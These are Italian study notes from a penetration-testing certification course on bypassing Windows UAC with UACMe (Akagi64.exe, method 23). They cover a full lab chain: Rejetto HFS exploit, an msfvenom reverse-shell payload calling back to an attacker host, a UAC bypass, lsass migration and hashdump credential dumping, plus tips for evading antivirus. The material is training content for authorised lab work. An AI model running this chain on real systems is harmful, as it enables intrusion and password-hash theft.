# 012 — Bypassing UAC with UACMe (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 12/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [012_Bypassing UAC with UACMe.txt](012_Bypassing UAC with UACMe.txt) · [012_Bypassing UAC with UACMe.srt](012_Bypassing UAC with UACMe.srt)

## Concetti chiave

- **UAC** (User Account Control, introdotto in Vista) impedisce a programmi di fare modifiche di sistema senza approvazione esplicita: un utente del gruppo **Administrators** lavora di default con token **filtrato** (medium integrity), e ottiene privilegi admin solo dopo il **consent prompt**.
- Un attaccante con shell come membro di Administrators **non ha** comunque i privilegi admin nel token corrente → `whoami /priv` mostra privilegi standard, `hashdump` fallisce, `getsystem` fallisce.
- **UAC Bypass** = eseguire un payload come **High Integrity / Administrator** senza mostrare il consent prompt, sfruttando **auto-elevate** di binari Windows firmati Microsoft.
- **UACMe** (di hfiref0x) = framework con **>60 tecniche** di bypass UAC, distribuito come `Akagi.exe` (`Akagi32.exe` / `Akagi64.exe`).
- **Requisiti**: utente target deve essere nel gruppo **local Administrators** + tecnica adatta alla versione di Windows.
- Risultato lab: shell come `admin` (in Administrators) su Server 2012 → `Akagi64.exe 23 backdoor.exe` (method 23 = `pkgmgr.exe` DLL hijack) → nuova session admin → migrate in lsass → `hashdump`.

## Spiegazione approfondita

### Cosa è davvero UAC

- Quando un utente che appartiene ad Administrators fa login → LSASS crea **due token**:
  - **Filtered token** (medium integrity) usato di default.
  - **Elevated token** (high integrity) attivato solo via consent prompt o "Run as administrator".
- I due prompt:
  - **Consent prompt** (per utenti in Administrators): solo conferma Yes/No.
  - **Credential prompt** (per utenti standard): richiede credenziali admin.

### Perché serve il bypass

In sessione remota (reverse shell, meterpreter) **non si può cliccare Yes** sul prompt. Quindi non si può "Run as administrator" interattivamente. UAC Bypass aggira l'intera richiesta sfruttando binari Windows che si auto-elevano senza prompt.

### Auto-elevate binaries

Microsoft ha eseguibili firmati che hanno `autoElevate=true` nel manifest (es. `pkgmgr.exe`, `fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`, `sdclt.exe`, `slui.exe`, `ComputerDefaults.exe`). Se l'attaccante riesce a far caricare codice arbitrario in quei processi (via DLL hijack, registry hijack su `HKCU\Software\Classes\<...>\shell\open\command`, COM hijack), il codice gira **elevato** senza alcun prompt.

### UACMe — struttura

- `Akagi32.exe` / `Akagi64.exe`: binario principale (scegli secondo l'arch del target).
- Sintassi: `Akagi64.exe <method> [optional_command]`.
- Ogni **method** (1..70+) è documentato nel README del repo `hfiref0x/UACME` con: autore, tecnica (DLL hijack, COM hijack, registry hijack, ecc.), versione Windows supportata, stato (Fixed/Unfixed in versione X).
- Se ometti il comando → spawna `cmd.exe` elevato di default.

### Metodi famosi

| # | Tecnica | Versione | Note |
|---|---|---|---|
| 23 | DLL hijack su `pkgmgr.exe` | Win 7 → 10 | Usato nel lab |
| 33 | DLL hijack su `consent.exe` | | |
| 41 | `eventvwr.exe` + registry hijack `mscfile` | Win 7 → 10 1809 (fix) | Famoso "Enigma0x3" |
| 56 | `fodhelper.exe` + `ms-settings` hijack | Win 10 | Tra i più usati |
| 62 | `slui.exe` + env var | | |

### Workflow lab

1. **Recon + access**: nmap → Rejetto HFS port 80 → `exploit/windows/http/rejetto_hfs_exec` → meterpreter come `admin`.
2. **Recon target**: `sysinfo` → Windows Server 2012. `migrate` in `explorer.exe`.
3. **Verifica check 1** (membro Administrators): `net localgroup administrators` → `admin` presente.
4. **Verifica check 2** (token filtrato): `whoami /priv` mostra solo privilegi standard, `hashdump` fallisce, `getsystem` fallisce.
5. **Payload**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI> LPORT=5555 -f exe -o backdoor.exe`.
6. **Handler** secondario: `multi/handler` con LPORT 5555 (foreground, no `-j`).
7. **Upload** in `C:\Users\admin\AppData\Local\Temp\`: `backdoor.exe` + `Akagi64.exe`.
8. **Esecuzione**: `Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe`.
9. **Nuova session**: `getuid` ancora `admin` MA `getprivs` mostra TUTTI i privilegi admin → high integrity.
10. **Validazione**: `migrate <lsass PID>` + `hashdump` ok.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `net localgroup administrators` | Verifica appartenenza al gruppo (check 1) |
| `whoami /priv` | Verifica integrità token (check 2 — solo privilegi base = filtered) |
| `whoami /groups` | Mostra "Mandatory Label\Medium Mandatory Level" se filtered |
| `getsystem` (meterpreter) | Tentativo automatico (fallisce su UAC alto) |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=5555 -f exe -o backdoor.exe` | Payload |
| `use exploit/multi/handler` | Listener |
| `upload backdoor.exe`, `upload Akagi64.exe` | Trasferimento file |
| `Akagi64.exe <method#> <full\path\payload.exe>` | Bypass UAC |
| `hashdump` (post-migrate lsass) | Validazione integrità admin/SYSTEM |

## Esempi pratici

```bash
# 1. Initial access
nmap -Pn -n -sS -sV 10.10.10.x
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.x
exploit
# → meterpreter come 'admin'

meterpreter > sysinfo            # Windows Server 2012
meterpreter > migrate <PID-explorer>
meterpreter > getuid             # admin
meterpreter > shell
C:\> net localgroup administrators
... admin
C:\> whoami /priv
... solo SeChangeNotify, SeShutdown, ecc.   ← FILTRATO
C:\> exit
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: ...
meterpreter > getsystem
[-] All techniques failed.
```

```bash
# 2. Payload + handler secondario
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.22.2 LPORT=5555 -f exe -o backdoor.exe

# nuova sessione msf:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.22.2
set LPORT 5555
exploit
```

```text
# 3. Upload + bypass UAC (method 23 = pkgmgr.exe)
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload /root/backdoor.exe
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter > shell
C:\Users\admin\AppData\Local\Temp> Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

```text
# 4. Validazione nuova session
meterpreter > getuid
Server username: TARGET\admin
meterpreter > getprivs
============================================================
 SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,
 SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, ...
meterpreter > migrate <PID-lsass>
meterpreter > hashdump          # ora funziona
```

## Punti d'attenzione per l'esame eCPPT

- **Due check fondamentali PRIMA di tentare UAC bypass**:
  1. Sei in `Administrators` → `net localgroup administrators`.
  2. Il tuo token è filtrato → `whoami /priv` minimal + `hashdump` fail + `getsystem` fail.
- **Se NON sei in Administrators** → UAC bypass è inutile, serve altro vettore (token impersonation, service misconfig, ecc.).
- **Scelta del metodo**: dipende da **versione + build** Windows + se la tecnica è ancora **Unfixed**. Consulta sempre la tabella del repo `hfiref0x/UACME`.
- **Sintassi minima da memorizzare**: `Akagi64.exe <method#> <payload.exe>`.
- **Akagi64 vs Akagi32**: deve **matchare l'architettura** del processo target (di solito 64-bit moderno).
- **`getsystem` fallisce ≠ UAC è massimo**. `getsystem` ha 3 tecniche legacy; UAC bypass moderno passa altrove.
- **Risultato**: bypass dà privilegi **High Integrity / Administrator**, NON SYSTEM. Per SYSTEM da admin: nuovo step (es. service install, `psexec -s`, token impersonation di un SYSTEM token in memoria, scheduled task).
- **OPSEC**: AV detection alta su `Akagi.exe` (è famoso). Possibili rename, packer, ricompilazione da sorgente.
- **Method 23 (pkgmgr.exe) → DLL hijack**: collega al video [[013_DLL Hijacking]].

## Collegamenti con altri video

- Precedente: [[011_Juicy Potato]] — per SYSTEM da service account.
- Prossimo: [[013_DLL Hijacking]] — la base tecnica di molti method UACMe.
- `whoami /priv` e integrità: [[02_Introduction to Privilege Escalation]].
- Da Admin a SYSTEM: vedi video token impersonation/Potato + `psexec`.
- Repo upstream: `https://github.com/hfiref0x/UACME` — riferimento per scegliere il method.
